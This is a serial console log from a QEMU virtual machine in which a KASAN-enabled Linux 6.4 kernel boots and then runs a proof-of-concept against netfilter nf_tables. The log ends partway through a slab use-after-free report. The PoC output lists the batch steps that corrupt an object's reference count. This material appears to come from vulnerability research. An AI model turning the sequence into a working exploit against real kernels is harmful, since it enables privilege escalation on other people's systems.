bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+BEFCEF00+BEF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004bc73a8
input_len: 0x00000000019cff1a
output: 0x0000000001000000
output_len: 0x0000000005521208
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Thu May  7 08:00:28 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x00000000bffdffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000bffe0000-0x00000000bfffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000100000000-0x000000013fffffff] usable
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000002] kvm-clock: using sched offset of 491594560 cycles
[    0.001373] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.009925] tsc: Detected 2995.198 MHz processor
[    0.011759] last_pfn = 0x140000 max_arch_pfn = 0x400000000
[    0.013339] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.015422] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.017341] last_pfn = 0xbffe0 max_arch_pfn = 0x400000000
[    0.023939] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.025885] Using GB pages for direct mapping
[    0.027239] Incomplete global flushes, disabling PCID
[    0.028020] RAMDISK: [mem 0xbfe4f000-0xbffdffff]
[    0.030568] ACPI: Early table checksum verification disabled
[    0.033992] ACPI: RSDP 0x00000000000F59B0 000014 (v00 BOCHS )
[    0.035440] ACPI: RSDT 0x00000000BFFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.037566] ACPI: FACP 0x00000000BFFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.040475] ACPI: DSDT 0x00000000BFFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.043103] ACPI: FACS 0x00000000BFFE0000 000040
[    0.046439] ACPI: APIC 0x00000000BFFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.048871] ACPI: HPET 0x00000000BFFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.051277] ACPI: WAET 0x00000000BFFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.053455] ACPI: Reserving FACP table memory at [mem 0xbffe19df-0xbffe1a52]
[    0.055196] ACPI: Reserving DSDT table memory at [mem 0xbffe0040-0xbffe19de]
[    0.056940] ACPI: Reserving FACS table memory at [mem 0xbffe0000-0xbffe003f]
[    0.061124] ACPI: Reserving APIC table memory at [mem 0xbffe1a53-0xbffe1ad2]
[    0.063426] ACPI: Reserving HPET table memory at [mem 0xbffe1ad3-0xbffe1b0a]
[    0.065361] ACPI: Reserving WAET table memory at [mem 0xbffe1b0b-0xbffe1b32]
[    0.067810] No NUMA configuration found
[    0.068788] Faking a node at [mem 0x0000000000000000-0x000000013fffffff]
[    0.070388] NODE_DATA(0) allocated [mem 0x13fffa000-0x13fffdfff]
[    0.072032] Zone ranges:
[    0.072716]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.074293]   DMA32    [mem 0x0000000001000000-0x00000000ffffffff]
[    0.075855]   Normal   [mem 0x0000000100000000-0x000000013fffffff]
[    0.077467] Movable zone start for each node
[    0.078496] Early memory node ranges
[    0.079655]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.081319]   node   0: [mem 0x0000000000100000-0x00000000bffdffff]
[    0.083180]   node   0: [mem 0x0000000100000000-0x000000013fffffff]
[    0.084880] Initmem setup node 0 [mem 0x0000000000001000-0x000000013fffffff]
[    0.087588] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.087632] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.117016] On node 0, zone Normal: 32 pages in unavailable ranges
[    0.722230] kasan: KernelAddressSanitizer initialized
[    0.727460] ACPI: PM-Timer IO Port: 0x608
[    0.728473] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.730062] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.731806] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.733615] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.735539] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.738082] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.740720] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.742695] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.744341] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.745707] TSC deadline timer available
[    0.746728] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.748037] kvm-guest: KVM setup pv remote TLB flush
[    0.749339] kvm-guest: setup PV sched yield
[    0.750435] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.752588] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.754958] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.757561] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.760146] PM: hibernation: Registered nosave memory: [mem 0xbffe0000-0xbfffffff]
[    0.762296] PM: hibernation: Registered nosave memory: [mem 0xc0000000-0xfeffbfff]
[    0.764616] PM: hibernation: Registered nosave memory: [mem 0xfeffc000-0xfeffffff]
[    0.766565] PM: hibernation: Registered nosave memory: [mem 0xff000000-0xfffbffff]
[    0.768487] PM: hibernation: Registered nosave memory: [mem 0xfffc0000-0xffffffff]
[    0.770458] [mem 0xc0000000-0xfeffbfff] available for PCI devices
[    0.772006] Booting paravirtualized kernel on KVM
[    0.773580] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.787301] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.791957] percpu: Embedded 66 pages/cpu s232168 r8192 d29976 u1048576
[    0.793979] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.796522] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.798842] random: crng init done
[    0.807475] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes, linear)
[    0.812294] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.814857] Fallback order for Node 0: 0 
[    0.814871] Built 1 zonelists, mobility grouping on.  Total pages: 1031904
[    0.817756] Policy zone: Normal
[    0.818599] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.820325] stackdepot: allocating hash table via alloc_large_system_hash
[    0.832081] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.833963] software IO TLB: area num 2.
[    0.982539] Memory: 3425548K/4193784K available (49152K kernel code, 7946K rwdata, 10072K rodata, 5644K init, 2948K bss, 767980K reserved, 0K cma-reserved)
[    0.985526] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.988950] Dynamic Preempt: voluntary
[    0.989942] rcu: Preemptible hierarchical RCU implementation.
[    0.991420] rcu: 	RCU event tracing is enabled.
[    0.992647] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.994236] 	Trampoline variant of Tasks RCU enabled.
[    0.995358] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.997158] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    1.007147] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    1.008662] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    1.017215] Console: colour VGA+ 80x25
[    1.018121] printk: console [ttyS0] enabled
[    1.018121] printk: console [ttyS0] enabled
[    1.019628] printk: bootconsole [earlyser0] disabled
[    1.019628] printk: bootconsole [earlyser0] disabled
[    1.022002] ACPI: Core revision 20230331
[    1.023116] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    1.025240] APIC: Switch to symmetric I/O mode setup
[    1.026435] kvm-guest: setup PV IPIs
[    1.029221] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    1.030664] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    1.032558] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    1.034054] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    1.034857] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    1.036556] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    1.037579] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    1.038563] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    1.039555] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    1.040561] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    1.041557] RETBleed: Mitigation: Enhanced IBRS
[    1.042560] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    1.043557] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    1.044556] MMIO Stale Data: Unknown: No mitigations
[    1.046562] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    1.047554] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    1.048554] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    1.049555] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    1.050556] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    1.067837] Freeing SMP alternatives memory: 44K
[    1.068556] pid_max: default: 32768 minimum: 301
[    1.069656] LSM: initializing lsm=capability,selinux,integrity
[    1.070571] SELinux:  Initializing.
[    1.071752] Mount-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    1.072655] Mountpoint-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    1.075462] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    1.076338] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    1.076646] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    1.077607] signal: max sigframe size: 1776
[    1.078684] rcu: Hierarchical SRCU implementation.
[    1.079559] rcu: 	Max phase no-delay instances is 400.
[    1.081435] smp: Bringing up secondary CPUs ...
[    1.082062] smpboot: x86: Booting SMP configuration:
[    1.082561] .... node  #0, CPUs:      #1
[    1.083648] smp: Brought up 1 node, 2 CPUs
[    1.085396] smpboot: Max logical packages: 1
[    1.085558] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    1.087757] devtmpfs: initialized
[    1.091839] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    1.092565] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    1.094290] PM: RTC time: 08:01:09, date: 2026-05-07
[    1.095034] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    1.095974] audit: initializing netlink subsys (disabled)
[    1.096908] audit: type=2000 audit(1778140870.435:1): state=initialized audit_enabled=0 res=1
[    1.097120] thermal_sys: Registered thermal governor 'step_wise'
[    1.097563] thermal_sys: Registered thermal governor 'user_space'
[    1.098632] cpuidle: using governor menu
[    1.100907] PCI: Using configuration type 1 for base access
[    1.101902] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    1.104131] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    1.105561] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    1.108013] ACPI: Added _OSI(Module Device)
[    1.108561] ACPI: Added _OSI(Processor Device)
[    1.109549] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.110559] ACPI: Added _OSI(Processor Aggregator Device)
[    1.121008] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.175235] ACPI: Interpreter enabled
[    1.175656] ACPI: PM: (supports S0 S3 S4 S5)
[    1.176595] ACPI: Using IOAPIC for interrupt routing
[    1.177623] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.178562] PCI: Using E820 reservations for host bridge windows
[    1.180334] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.196722] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.197779] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.198611] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.199943] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.201036] PCI host bridge to bus 0000:00
[    1.201576] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.202568] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.203571] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.204695] pci_bus 0000:00: root bus resource [mem 0xc0000000-0xfebfffff window]
[    1.205562] pci_bus 0000:00: root bus resource [mem 0x140000000-0x1bfffffff window]
[    1.206566] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.207809] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    1.215203] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    1.222531] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    1.224110] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    1.225221] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    1.225563] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    1.226562] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    1.227563] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    1.228988] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    1.230382] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.230574] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.232020] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    1.234521] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    1.236635] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    1.241938] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    1.242944] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.250577] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    1.252467] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    1.253369] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    1.258032] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    1.267443] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.268147] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.269237] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.270155] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.270811] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.273378] iommu: Default domain type: Translated 
[    1.273561] iommu: DMA domain TLB invalidation policy: lazy mode 
[    1.274989] SCSI subsystem initialized
[    1.276082] ACPI: bus type USB registered
[    1.277674] usbcore: registered new interface driver usbfs
[    1.278585] usbcore: registered new interface driver hub
[    1.279614] usbcore: registered new device driver usb
[    1.279687] pps_core: LinuxPPS API ver. 1 registered
[    1.280553] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.284939] PTP clock support registered
[    1.287836] Advanced Linux Sound Architecture Driver Initialized.
[    1.290090] NetLabel: Initializing
[    1.290561] NetLabel:  domain hash size = 128
[    1.291559] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.292798] NetLabel:  unlabeled traffic allowed by default
[    1.293782] PCI: Using ACPI for IRQ routing
[    1.295641] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.296553] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.296553] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.296606] vgaarb: loaded
[    1.297926] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.298561] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.304868] clocksource: Switched to clocksource kvm-clock
[    1.355964] VFS: Disk quotas dquot_6.6.0
[    1.356912] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.358797] pnp: PnP ACPI init
[    1.361356] pnp: PnP ACPI: found 6 devices
[    1.377152] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.379266] NET: Registered PF_INET protocol family
[    1.381252] IP idents hash table entries: 65536 (order: 7, 524288 bytes, linear)
[    1.384330] tcp_listen_portaddr_hash hash table entries: 2048 (order: 3, 32768 bytes, linear)
[    1.387451] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.390269] TCP established hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.393404] TCP bind hash table entries: 32768 (order: 8, 1048576 bytes, linear)
[    1.398939] TCP: Hash tables configured (established 32768 bind 32768)
[    1.400752] UDP hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    1.402526] UDP-Lite hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    1.405743] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.408445] RPC: Registered named UNIX socket transport module.
[    1.410332] RPC: Registered udp transport module.
[    1.411545] RPC: Registered tcp transport module.
[    1.412802] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.415554] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.417270] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.418897] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.420732] pci_bus 0000:00: resource 7 [mem 0xc0000000-0xfebfffff window]
[    1.422752] pci_bus 0000:00: resource 8 [mem 0x140000000-0x1bfffffff window]
[    1.426875] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.429242] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.431765] PCI: CLS 0 bytes, default 64
[    1.433457] PCI-DMA: Using software bounce buffering for IO (SWIOTLB)
[    1.434112] Unpacking initramfs...
[    1.435855] software IO TLB: mapped [mem 0x00000000bbe4f000-0x00000000bfe4f000] (64MB)
[    1.439224] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    1.441553] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    1.447434] Initialise system trusted keyrings
[    1.449211] workingset: timestamp_bits=56 max_order=20 bucket_order=0
[    1.454183] NFS: Registering the id_resolver key type
[    1.455828] Key type id_resolver registered
[    1.456915] Key type id_legacy registered
[    1.458155] 9p: Installing v9fs 9p2000 file system support
[    1.466677] Key type asymmetric registered
[    1.468126] Asymmetric key parser 'x509' registered
[    1.469946] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.471115] Freeing initrd memory: 1604K
[    1.472620] io scheduler mq-deadline registered
[    1.475266] io scheduler kyber registered
[    1.477155] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.479646] ACPI: button: Power Button [PWRF]
[    1.482132] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.484255] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.490011] Non-volatile memory driver v1.3
[    1.491727] Linux agpgart interface v0.103
[    1.493187] ACPI: bus type drm_connector registered
[    1.505313] loop: module loaded
[    1.509202] scsi host0: ata_piix
[    1.511014] scsi host1: ata_piix
[    1.512043] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    1.514235] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    1.517616] e100: Intel(R) PRO/100 Network Driver
[    1.518916] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.520357] e1000: Intel(R) PRO/1000 Network Driver
[    1.521692] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.670508] ata2: found unknown device (class 0)
[    1.672165] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.674618] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.688882] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.690411] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.980167] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    2.352254] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    2.353699] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    2.359414] e1000e: Intel(R) PRO/1000 Network Driver
[    2.362225] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    2.364774] sky2: driver version 1.30
[    2.366308] usbcore: registered new interface driver usblp
[    2.367472] usbcore: registered new interface driver usb-storage
[    2.368875] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    2.371913] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.373050] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.374817] rtc_cmos 00:05: RTC can wake from S4
[    2.376659] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    2.380372] rtc_cmos 00:05: registered as rtc0
[    2.382728] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    2.385815] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    2.388766] intel_pstate: CPU model not supported
[    2.390114] hid: raw HID events driver (C) Jiri Kosina
[    2.392996] usbcore: registered new interface driver usbhid
[    2.395558] usbhid: USB HID core driver
[    2.400123] Initializing XFRM netlink socket
[    2.401367] NET: Registered PF_INET6 protocol family
[    2.403725] Segment Routing with IPv6
[    2.404679] In-situ OAM (IOAM) with IPv6
[    2.405730] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    2.407861] NET: Registered PF_PACKET protocol family
[    2.409337] 9pnet: Installing 9P2000 support
[    2.410771] Key type dns_resolver registered
[    2.413182] IPI shorthand broadcast: enabled
[    2.433190] sched_clock: Marking stable (2413014353, 19486808)->(2561287900, -128786739)
[    2.437217] registered taskstats version 1
[    2.438364] Loading compiled-in X.509 certificates
[    2.448575] PM:   Magic number: 10:327:17
[    2.451786] printk: console [netcon0] enabled
[    2.452921] netconsole: network logging started
[    2.454230] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    2.456559] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    2.458666] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    2.460685] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    2.464162] cfg80211: failed to load regulatory.db
[    2.464916] ALSA device list:
[    2.466515]   No soundcards found.
[    2.468467] Freeing unused kernel image (initmem) memory: 5644K
[    2.474623] Write protecting the kernel read-only data: 59392k
[    2.475766] Freeing unused kernel image (rodata/data gap) memory: 168K
[    2.486772] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.488661] Run /init as init process
[    2.492835] mount (55) used greatest stack depth: 28760 bytes left
[    2.494548] mount (56) used greatest stack depth: 28256 bytes left

secb: rootfs ready
---- poc begin ----
[*] batch 1: NEWTABLE t1
[*] batch 2: NEWOBJ victim_obj + NEWSET s_ref + 16 x NEWSETELEM (victim_obj->use = 16)
[*] primitive 1/16: tmp_0..15 NEWSET+CATCHALL committed, then flush+DELSET (net -1 on victim_obj->use per primitive)
[*] DELOBJ victim_obj (victim_obj->use==0 -> allowed; kfree on commit)
[    3.009262] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[*] GETSETELEM s_ref dump (each elem reads (*nft[    3.016880] ==================================================================
_set_ext_obj(ext[    3.017806] BUG: KASAN: slab-use-after-free in nf_tables_fill_setelem.isra.0+0xe3f/0xf10
))->key.name)
[    3.021552] Read of size 8 at addr ffff888103c57620 by task poc/61
[    3.022532] 
[    3.022743] CPU: 0 PID: 61 Comm: poc Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    3.023712] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    3.024762] Call Trace:
[    3.025065]  <TASK>
[    3.025353]  dump_stack_lvl+0x36/0x50
[    3.025887]  print_report+0xcf/0x660
[    3.026359]  ? nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    3.027080]  kasan_report+0xc7/0x100
[    3.027614]  ? nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    3.028397]  nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    3.029016]  ? _raw_spin_lock+0x80/0xe0
[    3.029659]  ? __pfx_nf_tables_fill_setelem.isra.0+0x10/0x10
[    3.030626]  ? __pfx__raw_spin_lock+0x10/0x10
[    3.031320]  ? get_page_from_freelist+0x1a57/0x30a0
[    3.032139]  ? rhashtable_walk_start_check+0x13e/0x760
[    3.033131]  nft_rhash_walk+0x23e/0x4a0
[    3.033875]  ? __netlink_dump_start+0x661/0xa40
[    3.034586]  ? nf_tables_getsetelem+0x7ad/0xab0
[    3.035295]  ? nfnetlink_rcv_msg+0x456/0x8b0
[    3.035950]  ? __pfx_nft_rhash_walk+0x10/0x10
[    3.036607]  ? netlink_sendmsg+0x7b7/0xc60
[    3.037147]  nf_tables_dump_set+0x8a5/0xdd0
[    3.037720]  ? __pfx_nf_tables_dump_set+0x10/0x10
[    3.038300]  ? __alloc_skb+0x10d/0x280
[    3.038817]  ? __pfx_nf_tables_dump_setelem+0x10/0x10
[    3.039482]  ? __pfx_mutex_lock+0x10/0x10
[    3.040005]  netlink_dump+0x4fe/0x1070
[    3.040495]  ? __pfx_netlink_dump+0x10/0x10
[    3.041077]  ? __kasan_kmalloc+0x8f/0xa0
[    3.041603]  ? mutex_unlock+0x7f/0xd0
[    3.042678]  ? __pfx_mutex_unlock+0x10/0x10
[    3.044530]  __netlink_dump_start+0x661/0xa40
[    3.046301]  nf_tables_getsetelem+0x7ad/0xab0
[    3.047855]  ? __pfx_nf_tables_getsetelem+0x10/0x10
[    3.049911]  ? __pfx_nf_tables_dump_set_start+0x10/0x10
[    3.050517]  ? __pfx_nf_tables_dump_set+0x10/0x10
[    3.051025]  ? __pfx_nf_tables_dump_set_done+0x10/0x10
[    3.051666]  ? __pfx___nla_validate_parse+0x10/0x10
[    3.052298]  nfnetlink_rcv_msg+0x456/0x8b0
[    3.052879]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[    3.053579]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    3.054226]  ? kasan_save_stack+0x43/0x60
[    3.054836]  ? kasan_save_stack+0x33/0x60
[    3.055438]  ? kasan_set_track+0x25/0x30
[    3.056030]  ? __kasan_slab_alloc+0x6e/0x70
[    3.056654]  ? kmem_cache_alloc_node+0x110/0x280
[    3.057336]  ? kmalloc_reserve+0x110/0x1e0
